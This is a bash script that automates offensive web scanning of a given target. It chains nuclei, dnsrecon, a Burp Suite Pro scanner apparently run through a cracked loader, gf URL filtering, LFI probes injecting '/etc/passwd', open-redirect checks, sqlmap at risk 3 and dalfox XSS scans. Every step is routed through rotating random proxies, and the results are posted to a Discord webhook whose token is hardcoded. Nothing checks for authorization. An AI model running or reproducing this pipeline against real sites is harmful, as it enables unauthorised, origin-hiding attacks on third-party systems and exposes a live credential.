#!/bin/bash

BURP_HOST=127.0.0.1
BURP_PORT=1338



#GOBIN=/home/$USER/go/bin/home/$USER/go/bin

chmod -R 777 ./scan_results

discord_url="https://discord.com/api/webhooks/1024983656525209671/YHIA3nhpyAwBO44qsei24RGQIWZQWamDL1_jHepXljHevVy07JibCnRl6GUIIfCE16Fe"



while getopts 'u:p:f:o:' OPTION; do
  case "$OPTION" in
    u)
      uvalue="$OPTARG"
      #echo "url provided is $OPTARG"
      ;;
    p)
      pvalue="$OPTARG"
      #echo "proxy provided is $OPTARG"

      nuclei_proxy=" -p $pvalue"
      dalfox_proxy=" --proxy=$pvalue"

      ;;
    f)
      fvalue="$OPTARG"
      #echo "file provided is $OPTARG"

     

      ;;
    o)
      outvalue="$OPTARG"
      #echo "ouput provided is $OPTARG"

     

      ;;
    ?)
      echo "script usage: $(basename \$0) url [-p" >2
      exit 1
      ;;
  esac
done
shift "$(($OPTIND -1))"


FILE=$outvalue"/nuclei_output.md"

if [[ ! -f "$FILE"   ]]; then

echo "NUCLEI $uvalue"

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
nuclei_proxy=" -p https://$proxy_https_random_int"

timeout 8m ~/go/bin/nuclei -l $fvalue -o $outvalue"/nuclei_output_crit.md"  -project-path $outvalue   -rlm 35 -s critical   $nuclei_proxy 

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
nuclei_proxy=" -p https://$proxy_https_random_int"

timeout 8m ~/go/bin/nuclei -l $fvalue -o $outvalue"/nuclei_output_high.md"  -project-path $outvalue   -rlm 35 -s high   $nuclei_proxy 

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
nuclei_proxy=" -p https://$proxy_https_random_int"

timeout 8m ~/go/bin/nuclei -l $fvalue -o $outvalue"/nuclei_output_med.md"  -project-path $outvalue   -rlm 35 -s medium   $nuclei_proxy 

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
nuclei_proxy=" -p https://$proxy_https_random_int"

timeout 4m ~/go/bin/nuclei -l $fvalue -o $outvalue"/nuclei_output_low.md"  -project-path $outvalue   -rlm 35 -s low   $nuclei_proxy 

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
nuclei_proxy=" -p https://$proxy_https_random_int"

timeout 4m ~/go/bin/nuclei -l $fvalue -o $outvalue"/nuclei_output_info.md"  -project-path $outvalue   -rlm 35 -s info   $nuclei_proxy 

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
nuclei_proxy=" -p https://$proxy_https_random_int"

timeout 4m ~/go/bin/nuclei -l $fvalue -o $outvalue"/nuclei_output_unknown.md"  -project-path $outvalue   -rlm 35 -s unknown   $nuclei_proxy 
wait < <(jobs -p)
cat $outvalue/nuclei_output_* > $outvalue"/nuclei_output.md"

#sleep 3;
size=$(wc -c $outvalue/nuclei_output.md | awk '{print $1}')
if [[ size -gt 0 ]]; then

#valtxt = $(cat $outvalue/nuclei_output.md | tr -d '\n')
./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --text "Nuclei output of $uvalue " --file "$outvalue/nuclei_output.md" --username "Notification Bot"  
#./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --text "Nuclei output of $uvalue $valtxt"  --username "Notification Bot"  

fi

fi

# if [ -z "$pvalue" ]
# then
#       echo "SMUGGLER"
#       python3 ~/kaliTools/web/smuggler/smuggler.py -u  "$uvalue"
# else
#       echo "SMUGGLER DOES NOT SUPPORT PROXY"
# fi

FILE=$outvalue"/dnsrecon_output"

if [[ ! -f "$FILE"  ]]; then

# if [ -z "$pvalue" ]
# then
      echo "DNSRECON $uvalue "
      python3 ./dnsrecon/dnsrecon.py -a -d "$uvalue" -j $outvalue"/dnsrecon_output";
# else
#       echo "DNSRECON DOES NOT SUPPORT PROXY"
# fi


fi




# echo "XSSStrike"
# FILE=$(pwd)/site.txt
# FILE2=$(pwd)/site.txt
# if test ! -f "$FILE" ; then
#      echo 1;
#     for line in $(cat $FILE); do python3 ~/kaliTools/web/XSStrike/xsstrike.py -u "$line" --fuzzer --crawl --path --blind; done;
# fi

# if test ! -f "$FILE" ; then
#     echo 2;
#     nuclei -l ./site.txt -t ~/nuclei-templates/cnvd -t ~/nuclei-templates/cves -t ~/nuclei-templates/default-logins -t ~/nuclei-templates/dns -t ~/nuclei-templates/exposed-panels -t ~/nuclei-templates/exposures -t ~/nuclei-templates/file -t ~/nuclei-templates/headless -t ~/nuclei-templates/iot -t ~/nuclei-templates/miscellaneous -t ~/nuclei-templates/misconfiguration -t ~/nuclei-templates/network -t ~/nuclei-templates/ssl -t ~/nuclei-templates/takeovers -t ~/nuclei-templates/technologies -t ~/nuclei-templates/token-spray -t ~/nuclei-templates/vulnerabilities
# fi

# echo "DALFOX"
# if test ! -f "$FILE" ; then
#     dalfox file site.txt -H "X-Ext-Net: delta=true";
# fi


# echo curl -s http://$BURP_HOST:$BURP_PORT/v0.1/scan/16
# exit



# echo 1\n\r;



FILE=$outvalue"/unique_burp.md"

if [[ ! -f "$FILE"   ]]; then


TMP_FILE=$(mktemp -q /tmp/bar.XXXXXX)
if [[ $? -ne 0 ]]; then
    echo "$0: Can't create temp file, bye.."
    exit 1
fi
 

PORT_TO_INSERT=$(comm -23 <(seq 49152 65535 | sort) <(ss -Htan | awk '{print $4}' | cut -d':' -f2 | sort -u) | shuf | head -n 1)

BURP_PORT=$PORT_TO_INSERT

cat UserConfigPro.json | sed "s/1338/$PORT_TO_INSERT/" > $TMP_FILE

echo "BURP $uvalue "

 #/usr/lib/jvm/java-11-openjdk-amd64/bin/java -Djava.awt.headless=true --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:/opt/Burp.Suite.Professional.2020.9.2/BurpSuiteLoader_v2020.9.2.jar -noverify -jar /opt/Burp.Suite.Professional.2020.9.2/burpsuite_pro_v2020.9.2.jar --project-file=$outvalue/file_burp.burp --unpause-spider-and-scanner 2>1 /dev/null 

# echo /usr/lib/jvm/java-11-openjdk-amd64/bin/java -Djava.awt.headless=true --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:/opt/Burp.Suite.Professional.2020.9.2/BurpSuiteLoader_v2020.9.2.jar -noverify -jar /opt/Burp.Suite.Professional.2020.9.2/burpsuite_pro_v2020.9.2.jar --project-file=$outvalue/file_burp.burp --unpause-spider-and-scanner --user-config-file=./UserConfigPro.json 2>1 /dev/null 

/usr/lib/jvm/java-17-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -javaagent:/opt/Burp.Suite.Professional.2020.9.2/burploader.jar -noverify -jar /opt/Burp.Suite.Professional.2020.9.2/burpsuite_pro_v2023.2.3.jar -Djava.awt.headless=true  --project-file=$outvalue/file_burp.burp --unpause-spider-and-scanner  --user-config-file=$TMP_FILE 2>1 /dev/null 

# /usr/lib/jvm/java-11-openjdk-amd64/bin/java -Djava.awt.headless=true --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:/opt/Burp.Suite.Professional.2020.9.2/BurpSuiteLoader_v2020.9.2.jar -noverify -jar /opt/Burp.Suite.Professional.2020.9.2/burpsuite_pro_v2020.9.2.jar --project-file=$outvalue/file_burp.burp --unpause-spider-and-scanner  --user-config-file=$TMP_FILE 2>1 /dev/null 

last_pid=$!

sleep 15;
 
curl -s -X POST "http://$BURP_HOST:$BURP_PORT/v0.1/scan" -d "{\"scope\":{\"include\":[{\"rule\":\"$uvalue\"}],\"type\":\"SimpleScope\"},\"urls\":[\"$uvalue\"]}" 




sleep 300;

 for a in {1..30};
    do
      echo -n "[-] SCAN #$a: "

      echo "http://$BURP_HOST:$BURP_PORT/v0.1/scan/$a"
      curl -sI "http://$BURP_HOST:$BURP_PORT/v0.1/scan/$a" | grep HTTP | awk '{print $2}'
      BURP_STATUS=$(curl -s http://$BURP_HOST:$BURP_PORT/v0.1/scan/$a | grep -o  "crawl_and_audit.{1,100}" | cut -d\" -f3 | grep "remaining")
      echo $BURP_STATUS
      while [[ ${#BURP_STATUS} -gt "2" ]];
      do
        BURP_STATUS=$(curl -s http://$BURP_HOST:$BURP_PORT/v0.1/scan/$a | grep -o "crawl_and_audit.{1,100}" | cut -d\" -f3 | grep "remaining")
        BURP_STATUS_FULL=$(curl -s http://$BURP_HOST:$BURP_PORT/v0.1/scan/$a | grep -o  "crawl_and_audit.{1,100}" | cut -d\" -f3 )
        echo "[i] STATUS: $BURP_STATUS_FULL"
        sleep 15
      done
    done
    echo "[+] VULNERABILITIES: "
    echo "----------------------------------------------------------------"



 TARGET=$(echo $uvalue | tr ":" "_" | tr "/" "_")
 for a in {1..30};
    do  
          touch $outvalue"/"burpsuite-$TARGET-$a.txt;
          curl -s "http://$BURP_HOST:$BURP_PORT/v0.1/scan/$a" | jq '.issue_events[].issue | "[" + .severity + "] " + .name + " - " + .origin + .path' | sort -u | sed 's/\"//g' | tee $outvalue"/"burpsuite-$TARGET-$a.txt
    done
echo "END $uvalue "

cat $outvalue"/"burpsuite-$TARGET-* | sort | uniq  > $outvalue"/unique_burp.md"
rm  $outvalue"/"burpsuite-$TARGET-* 

kill -9 $last_pid
rm $TMP_FILE
#sleep 3;


size=$(wc -c $outvalue/unique_burp.md | awk '{print $1}')
if [[ size -gt 0 ]]; then
#./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --text "Burp output of $uvalue $( cat $outvalue/unique_burp.md)" --file "$outvalue/unique_burp.md" --username "Notification Bot"  
./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --text "Burp output of $uvalue " --file "$outvalue/unique_burp.md" --username "Notification Bot"  

fi

fi

FILE=$outvalue"/gf/debug_logic_urls.txt"

if [[ ! -f "$FILE"  ]]; then

error=$(mkdir $outvalue"/gf"  2>1)

cat $fvalue | ~/go/bin/gf debug_logic > $outvalue"/gf/debug_logic_urls.txt"
cat $fvalue | ~/go/bin/gf idor > $outvalue"/gf/idor_urls.txt"
cat $fvalue | ~/go/bin/gf img-traversal > $outvalue"/gf/img-traversal_urls.txt"
cat $fvalue | ~/go/bin/gf interestingEXT > $outvalue"/gf/interestingEXT_urls.txt"
cat $fvalue | ~/go/bin/gf interestingparams > $outvalue"/gf/interestingparams_urls.txt"
cat $fvalue | ~/go/bin/gf interestingsubs > $outvalue"/gf/interestingsubs_urls.txt"
cat $fvalue | ~/go/bin/gf jsvar > $outvalue"/gf/jsvar_urls.txt"
cat $fvalue | ~/go/bin/gf lfi > $outvalue"/gf/lfi_urls.txt"
cat $fvalue | ~/go/bin/gf rce > $outvalue"/gf/rce_urls.txt"
cat $fvalue | ~/go/bin/gf redirect > $outvalue"/gf/redirect_urls.txt"
cat $fvalue | ~/go/bin/gf sqli > $outvalue"/gf/sqli_urls.txt"
cat $fvalue | ~/go/bin/gf ssrf > $outvalue"/gf/ssrf_urls.txt"
cat $fvalue | ~/go/bin/gf ssti >  $outvalue"/gf/ssti_urls.txt"
cat $fvalue | ~/go/bin/gf xss > $outvalue"/gf/xss_urls.txt"
fi

FILE=$outvalue"/out_lfi"

if [[ ! -f "$FILE"  ]]; then

echo "Local File Inclusion $uvalue"

cat $fvalue | ~/go/bin/gf lfi | ~/go/bin/qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>1 | grep -q "root:x"  echo "VULN! %"' > $outvalue"/out_lfi" 

size=$(wc -c $outvalue/out_lfi | awk '{print $1}')
if [[ size -gt 0 ]]; then

./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --file $outvalue"/out_lfi" --username "Notification Bot" --text "out_lfi output of $uvalue " 

fi

fi


FILE=$outvalue"/out_open_redirect" 

if [[ ! -f "$FILE"  ]]; then

echo "Open Redirect $uvalue"
export LHOST="http://127.0.0.1:8080"; cat $fvalue | ~/go/bin/gf redirect | ~/go/bin/qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>1 | grep -q "Location: $LHOST"  echo "VULN! %"'> $outvalue"/out_open_redirect" 

size=$(wc -c $outvalue/out_open_redirect | awk '{print $1}')
if [[ size -gt 0 ]]; then

./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --file $outvalue"/out_open_redirect" --username "Notification Bot" --text "Out open redirect output of $uvalue " 

fi

fi





# | dalfox pipe --skip-bav -o $outvalue"/dalfox_output.md_2" --waf-evasion

FILE=$outvalue"/sqlmap.md"

if [[ ! -f "$FILE"   ]]; then

echo "Sqlmap $uvalue"

echo $uvalue > $outvalue"/sqli.txt"

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
sqlmap_proxy=" --proxy=https://$proxy_https_random_int"

echo sqlmap -u $uvalue --batch --output-dir=$outvalue  --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --random-agent --risk 3 --crawl=3 --forms --level 1 > "$outvalue/sqlmap.md" $sqlmap_proxy 
touch "$outvalue/sqlmap.md"
timeout 8m sqlmap -u $uvalue --batch --output-dir=$outvalue"/sqlmap"  --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --random-agent --risk 3 --crawl=3 --forms --level 1 $sqlmap_proxy | tee "$outvalue/sqlmap.md"  


sleep 10;

./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --file $outvalue"/sqlmap.md" --username "Notification Bot" --text "SqlMap output of $uvalue " 

fi




# echo "XSS"

# cat $fvalue| ~/go/bin/gf xss | sed 's/=.*/=/' | sort -u | tee $outvalue"/FILE.txt"  cat $outvalue"FILE.txt" | dalfox pipe > $outvalue"OUT.txt"

# echo "prototype pollution"

# cat $fvalue | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


FILE=$outvalue"/dalfox_output.md"

if [[ ! -f "$FILE"   ]]; then

echo "DALFOX $uvalue"

touch "$outvalue/dalfox_output.md"

proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
dalfox_proxy=" --proxy=https://$proxy_https_random_int"
#echo dalfox file $outvalue"/gf/xss_urls.txt" --worker=1 --delay 5000  --skip-bav -S -o "$outvalue/dalfox_output.md" --deep-domxss $dalfox_proxy  
for lll in $(cat $outvalue"/gf/xss_urls.txt" );
do 
echo timeout 6m dalfox url $lll -S --worker=1 --delay 5000  --skip-bav  -o "$outvalue/dalfox_output.md" --deep-domxss $dalfox_proxy  
timeout 6m dalfox url $lll -S --worker=1 --delay 5000  --skip-bav  -o "$outvalue/dalfox_output.md" --deep-domxss $dalfox_proxy  
size=$(wc -c $outvalue/dalfox_output.md | awk '{print $1}')
if [[ size -gt 0 ]]; then
./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --file $outvalue"/dalfox_output.md" --username "Notification Bot" --text "Dalfox output of $uvalue " 
fi
done 
proxy_https_random_int=$(shuf -n 1 /tmp/goodproxies.txt)
dalfox_proxy=" --proxy=https://$proxy_https_random_int"
echo timeout 25m dalfox url $uvalue -S --worker=1 --delay 5000  --skip-bav  -o "$outvalue/dalfox_output_2.md" --deep-domxss $dalfox_proxy  
timeout 25m dalfox url $uvalue -S --worker=1 --delay 5000  --skip-bav  -o "$outvalue/dalfox_output_2.md" --deep-domxss $dalfox_proxy  

cat "$outvalue/dalfox_output_2.md" >> "$outvalue/dalfox_output.md"

#sleep 3;

size=$(wc -c $outvalue/dalfox_output.md | awk '{print $1}')
if [[ $size -gt 0 ]]; then

./discord.sh-1.6.1/discord.sh --webhook-url=$discord_url --file $outvalue"/dalfox_output.md" --username "Notification Bot" --text "Dalfox output of $uvalue " 

fi

fi